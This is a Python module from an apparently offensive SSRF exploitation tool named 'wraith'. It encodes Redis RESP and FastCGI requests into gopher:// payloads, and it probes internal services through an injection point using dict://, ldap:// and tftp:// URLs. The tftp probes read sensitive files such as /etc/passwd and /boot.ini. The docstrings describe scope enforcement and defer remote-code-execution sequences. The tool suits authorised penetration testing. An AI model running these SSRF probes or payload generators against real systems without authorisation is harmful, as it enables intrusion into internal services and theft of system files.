"""Protocol modules: ``dict://``, ``ldap://``, ``tftp://`` recon + ``gopher://`` generator.

V0.1-CRITERIA.md #5 (base: dict + gopher); v0.4 adds ldap + tftp scheme probes:

* :func:`gopher_payload` / :func:`resp_encode` / :func:`fastcgi_encode` -- pure
  byte encoders that build a ``gopher://`` payload (Redis RESP or FastCGI), with
  correct ``%0d%0a`` CRLF and a single/double URL-encode toggle. This EMITS a
  payload for the operator; it does **not** fire it. Weaponized sequences
  (Redis cron/SSH/``MODULE LOAD``, FastCGI php-fpm RCE) are explicitly
  NOT-in-v0.1 -- deferred to a sandboxed ``--exploit`` gate.
* :func:`dict_recon` -- read-only ``dict://`` recon through an SSRF primitive
  (port/banner, Redis ``INFO``, Memcached ``stats``). Read-only by definition;
  it changes no target state.
* :func:`ldap_recon` (v0.4) -- inject ``ldap://host:389/`` (Root DSE) at the
  SSRF injection point and classify LDIF-format responses. Works through
  curl-backed SSRF sinks and any sink that supports the ldap:// scheme.
  Read-only: no bind, no modify.
* :func:`tftp_recon` (v0.4) -- inject ``tftp://host:69/filename`` for common
  sensitive files (``/etc/passwd``, ``/boot.ini``) and classify file-content
  signatures in echoed responses. Works through curl-backed SSRF sinks.
  Read-only by TFTP protocol design.

R5: response bytes classified for a service banner or file content are DATA --
substring-matched into evidence, never evaluated.
"""

from __future__ import annotations

import asyncio
from urllib.parse import quote

from wraith.client import ScanClient, get_client
from wraith.findings import CWE_SSRF, Finding

__all__ = [
    "resp_encode",
    "fastcgi_encode",
    "gopher_payload",
    "dict_url",
    "DICT_SERVICES",
    "detect_service",
    "dict_recon",
    # v0.4 ldap://
    "ldap_url",
    "LDAP_SIGNATURES",
    "detect_ldap_response",
    "ldap_recon",
    # v0.4 tftp://
    "tftp_url",
    "TFTP_SIGNATURES",
    "TFTP_PROBE_FILES",
    "detect_tftp_response",
    "tftp_recon",
]

# --------------------------------------------------------------------------- #
# gopher:// payload generator (pure byte encoders)
# --------------------------------------------------------------------------- #

def resp_encode(commands: list[list[str]]) -> bytes:
    """Encode Redis commands as the RESP wire protocol.

    ``[["SET", "k", "v"]]`` -> ``b"*3\\r\\n$3\\r\\nSET\\r\\n$1\\r\\nk\\r\\n$1\\r\\nv\\r\\n"``.
    """
    out = bytearray()
    for args in commands:
        out += f"*{len(args)}\r\n".encode()
        for arg in args:
            raw = arg.encode() if isinstance(arg, str) else arg
            out += f"${len(raw)}\r\n".encode() + raw + b"\r\n"
    return bytes(out)


def _fcgi_record(rec_type: int, request_id: int, content: bytes) -> bytes:
    """One FastCGI record (version 1) with 8-byte-aligned padding."""
    length = len(content)
    padding = (8 - length % 8) % 8
    header = bytes(
        [
            1,  # FCGI version
            rec_type,
            (request_id >> 8) & 0xFF,
            request_id & 0xFF,
            (length >> 8) & 0xFF,
            length & 0xFF,
            padding,
            0,  # reserved
        ]
    )
    return header + content + b"\x00" * padding


def _fcgi_nv(name: str, value: str) -> bytes:
    def enc_len(n: int) -> bytes:
        if n < 128:
            return bytes([n])
        return bytes([(n >> 24) | 0x80, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])

    nb, vb = name.encode(), value.encode()
    return enc_len(len(nb)) + enc_len(len(vb)) + nb + vb


def fastcgi_encode(params: dict[str, str], stdin: bytes = b"") -> bytes:
    """Encode a FastCGI responder request (BEGIN_REQUEST + PARAMS + STDIN).

    A generic byte encoder for the operator to review. It injects no PHP and
    fires nothing -- weaponized php-fpm RCE is NOT-in-v0.1.
    """
    request_id = 1
    begin = _fcgi_record(1, request_id, bytes([0, 1, 0, 0, 0, 0, 0, 0]))  # role=responder
    param_data = b"".join(_fcgi_nv(k, v) for k, v in params.items())
    params_rec = _fcgi_record(4, request_id, param_data) + _fcgi_record(4, request_id, b"")
    stdin_rec = _fcgi_record(5, request_id, stdin) + _fcgi_record(5, request_id, b"")
    return begin + params_rec + stdin_rec


def gopher_payload(
    host: str,
    port: int,
    data: bytes,
    *,
    item_type: str = "_",
    double_encode: bool = False,
) -> str:
    """Wrap raw ``data`` bytes into a ``gopher://`` URL.

    Every byte is percent-encoded (so CRLF becomes the required ``%0d%0a``).
    ``double_encode`` re-encodes the percent signs (``%0d`` -> ``%250d``) for
    filters that decode twice.
    """
    encoded = "".join(f"%{b:02x}" for b in data)
    if double_encode:
        encoded = encoded.replace("%", "%25")
    return f"gopher://{host}:{port}/{item_type}{encoded}"


# --------------------------------------------------------------------------- #
# dict:// read-only recon
# --------------------------------------------------------------------------- #

def dict_url(host: str, port: int, *args: str) -> str:
    """Build a ``dict://`` URL. ``dict_url("h", 6379, "INFO")`` -> ``dict://h:6379/INFO``.

    Multiple args map to a space-joined command line (``a:b`` -> ``a b``), the
    convention curl-backed fetchers use for ``dict://``.
    """
    path = ":".join(quote(a, safe="") for a in args)
    return f"dict://{host}:{port}/{path}"


# (service, port, command-args, banner signatures)
DICT_SERVICES: list[tuple[str, int, tuple[str, ...], tuple[str, ...]]] = [
    ("redis", 6379, ("INFO",), ("redis_version", "# Server", "connected_clients")),
    ("memcached", 11211, ("stats",), ("STAT ", "STAT pid", "STAT version")),
]


def detect_service(text: str) -> tuple[str, tuple[str, ...]] | None:
    """Classify a response against all known protocol service signatures (data-only).

    Checks dict-backend services (redis, memcached), then LDAP Root DSE, then
    TFTP file-content signatures. R5: ``text`` is untrusted; only substring-matched.
    """
    for service, _port, _cmd, sigs in DICT_SERVICES:
        matched = tuple(s for s in sigs if s in text)
        if len(matched) >= 2:
            return service, matched
    # ldap:// Root DSE (LDIF format)
    ldap_matched = detect_ldap_response(text)
    if ldap_matched:
        return "ldap", ldap_matched
    # tftp:// file content
    for _fname, label, sigs, min_hits in TFTP_PROBE_FILES:
        matched = tuple(s for s in sigs if s in text)
        if len(matched) >= min_hits:
            return f"tftp-{label}", matched
    return None


async def dict_recon(
    target,
    scope,
    *,
    host: str = "127.0.0.1",
    client: ScanClient | None = None,
    rate_limit: float | None = None,
    proxy: str | None = None,
    timeout: float = 10.0,
) -> list[Finding]:
    """Read-only ``dict://`` recon through an SSRF injection point.

    Injects a ``dict://`` recon URL for each known service into ``target``'s
    injection point, dispatches through the scope-enforced client, and emits a
    Finding when the echoed response carries a service banner. Read-only: only
    ``INFO`` / ``stats`` are sent; no state-changing command is generated.
    """
    own = client is None
    client = client or get_client(scope, rate_limit=rate_limit, proxy=proxy, timeout=timeout)
    findings: list[Finding] = []
    try:
        for service, port, cmd, _sigs in DICT_SERVICES:
            payload = dict_url(host, port, *cmd)
            method, url, headers, body = target.build_request(payload)
            try:
                resp = await client.request(method, url, headers=headers or None, content=body)
            except Exception:
                continue
            hit = detect_service(resp.text)
            if hit is not None:
                svc, matched = hit
                vector = target.injection.vector()
                findings.append(
                    Finding(
                        id=f"wraith-dict-{svc}",
                        tool="wraith",
                        title=f"SSRF dict:// recon exposed {svc} on {host}:{port}",
                        severity="medium",
                        confidence="high",
                        target=target.url,
                        vector=vector,
                        variant=f"dict:{svc}",
                        cwe_id=CWE_SSRF,
                        evidence={
                            "service": svc,
                            "injected_payload": payload,
                            "banner_signature": f"matched {', '.join(matched)}",
                        },
                        references=["https://cwe.mitre.org/data/definitions/918.html"],
                    )
                )
    finally:
        if own:
            await client.aclose()
    return findings


# --------------------------------------------------------------------------- #
# ldap:// scheme probes (v0.4)
# --------------------------------------------------------------------------- #

# Substrings present in an LDIF-format Root DSE response (anonymous read, no bind).
# curl's ldap:// backend returns LDIF; these appear in the first record. R5: data-only.
LDAP_SIGNATURES: tuple[str, ...] = (
    "namingContexts:",
    "supportedLDAPVersion:",
    "objectClass:",
    "subschemaSubentry:",
    "defaultNamingContext:",
    "dn:",
)
_LDAP_MIN_HITS = 2


def ldap_url(host: str, port: int = 389, base_dn: str = "") -> str:
    """Build a ``ldap://`` URL targeting the Root DSE or a specific ``base_dn``.

    ``ldap_url("127.0.0.1")`` -> ``ldap://127.0.0.1:389/``
    ``ldap_url("127.0.0.1", base_dn="dc=corp,dc=example")``
        -> ``ldap://127.0.0.1:389/dc%3Dcorp%2Cdc%3Dexample``

    Read-only: wraith performs no bind and no modify. The URL is sufficient for
    curl-backed SSRF sinks to return the Root DSE in LDIF format.
    """
    dn = quote(base_dn, safe="=") if base_dn else ""
    return f"ldap://{host}:{port}/{dn}"


def detect_ldap_response(text: str) -> tuple[str, ...] | None:
    """Return matched LDAP Root DSE signatures from ``text``, or None if below threshold.

    At least two LDIF attribute names must be present to distinguish a real LDAP
    Root DSE response from a generic HTTP error. R5: data-only substring match.
    """
    matched = tuple(s for s in LDAP_SIGNATURES if s in text)
    return matched if len(matched) >= _LDAP_MIN_HITS else None


async def ldap_recon(
    target,
    scope,
    *,
    host: str = "127.0.0.1",
    port: int = 389,
    base_dn: str = "",
    client: ScanClient | None = None,
    rate_limit: float | None = None,
    proxy: str | None = None,
    timeout: float = 10.0,
) -> list[Finding]:
    """Read-only ``ldap://`` recon through an SSRF injection point.

    Injects ``ldap://host:port/`` (Root DSE) at the target's injection point and
    classifies echoed responses using :data:`LDAP_SIGNATURES`. Works through
    curl-backed SSRF sinks (curl supports ldap:// via OpenLDAP) and any sink
    supporting the ldap:// scheme. Read-only: no bind, no modify.
    """
    own = client is None
    client = client or get_client(scope, rate_limit=rate_limit, proxy=proxy, timeout=timeout)
    findings: list[Finding] = []
    try:
        payload = ldap_url(host, port, base_dn)
        method, url, headers, body = target.build_request(payload)
        try:
            resp = await client.request(method, url, headers=headers or None, content=body)
        except Exception:
            return findings
        matched = detect_ldap_response(resp.text)
        if matched:
            vector = target.injection.vector()
            findings.append(
                Finding(
                    id=f"wraith-ldap-{host}-{port}",
                    tool="wraith",
                    title=f"SSRF ldap:// recon reached LDAP directory on {host}:{port}",
                    severity="high",
                    confidence="high",
                    target=target.url,
                    vector=vector,
                    variant="ldap:rootdse",
                    cwe_id=CWE_SSRF,
                    evidence={
                        "service": "ldap",
                        "injected_payload": payload,
                        "banner_signature": f"matched {', '.join(matched)}",
                    },
                    references=[
                        "https://cwe.mitre.org/data/definitions/918.html",
                        "https://owasp.org/www-community/attacks/LDAP_Injection",
                    ],
                )
            )
    finally:
        if own:
            await client.aclose()
    return findings


# --------------------------------------------------------------------------- #
# tftp:// scheme probes (v0.4)
# --------------------------------------------------------------------------- #

# Signatures for /etc/passwd (all present in any standard Unix passwd file).
TFTP_SIGNATURES: tuple[str, ...] = (
    "root:",
    "nobody:",
    "/bin/",
    "/home/",
    "/sbin/",
)
_TFTP_MIN_HITS = 2

# (filename, label, signatures, min_hits) — classic TFTP target files.
TFTP_PROBE_FILES: list[tuple[str, str, tuple[str, ...], int]] = [
    (
        "/etc/passwd",
        "unix-passwd",
        TFTP_SIGNATURES,
        2,
    ),
    (
        "/boot.ini",
        "win-boot-ini",
        ("[boot loader]", "[operating systems]", "multi(0)disk(0)", "timeout="),
        2,
    ),
]


def tftp_url(host: str, filename: str = "/etc/passwd", port: int = 69) -> str:
    """Build a ``tftp://`` URL.

    ``tftp_url("127.0.0.1")`` -> ``tftp://127.0.0.1:69/etc/passwd``

    TFTP is UDP-based (port 69) and read-only by protocol design. Only curl-backed
    SSRF sinks support ``tftp://`` natively. Useful for reading config files from
    network devices, PXE boot environments, and Unix hosts running tftpd.

    The path is passed verbatim; pass ``"/etc/passwd"`` for an absolute path,
    or a relative path like ``"config.txt"`` for a TFTP-root-relative fetch.
    """
    path = filename if filename.startswith("/") else f"/{filename}"
    return f"tftp://{host}:{port}{path}"


def detect_tftp_response(text: str, *, filename: str = "/etc/passwd") -> tuple[str, ...] | None:
    """Return matched TFTP file-content signatures, or None if below threshold.

    ``filename`` selects the signature set from :data:`TFTP_PROBE_FILES`. Falls
    back to :data:`TFTP_SIGNATURES` for unknown filenames. R5: data-only.
    """
    for fname, _label, sigs, min_hits in TFTP_PROBE_FILES:
        if fname == filename:
            matched = tuple(s for s in sigs if s in text)
            return matched if len(matched) >= min_hits else None
    matched = tuple(s for s in TFTP_SIGNATURES if s in text)
    return matched if len(matched) >= _TFTP_MIN_HITS else None


async def tftp_recon(
    target,
    scope,
    *,
    host: str = "127.0.0.1",
    port: int = 69,
    files: tuple[str, ...] = ("/etc/passwd",),
    client: ScanClient | None = None,
    rate_limit: float | None = None,
    proxy: str | None = None,
    timeout: float = 10.0,
) -> list[Finding]:
    """TFTP file-read recon through an SSRF injection point.

    Injects ``tftp://host:port/filename`` for each entry in ``files`` and
    classifies echoed responses against known file-content signatures. Read-only
    by TFTP protocol design: wraith only reads, never writes. Works through
    curl-backed SSRF sinks on targets with a running TFTP server (network device
    management stacks, PXE environments, etc.).
    """
    own = client is None
    client = client or get_client(scope, rate_limit=rate_limit, proxy=proxy, timeout=timeout)
    findings: list[Finding] = []
    try:
        for filename in files:
            payload = tftp_url(host, filename, port)
            method, url, headers, body = target.build_request(payload)
            try:
                resp = await client.request(method, url, headers=headers or None, content=body)
            except Exception:
                continue
            matched = detect_tftp_response(resp.text, filename=filename)
            if matched:
                vector = target.injection.vector()
                safe_id = filename.replace("/", "_").strip("_")
                findings.append(
                    Finding(
                        id=f"wraith-tftp-{host}-{port}-{safe_id}",
                        tool="wraith",
                        title=f"SSRF tftp:// recon read {filename} from {host}:{port}",
                        severity="high",
                        confidence="high",
                        target=target.url,
                        vector=vector,
                        variant=f"tftp:{filename}",
                        cwe_id=CWE_SSRF,
                        evidence={
                            "service": "tftp",
                            "injected_payload": payload,
                            "filename": filename,
                            "banner_signature": f"matched {', '.join(matched)}",
                        },
                        references=["https://cwe.mitre.org/data/definitions/918.html"],
                    )
                )
    finally:
        if own:
            await client.aclose()
    return findings
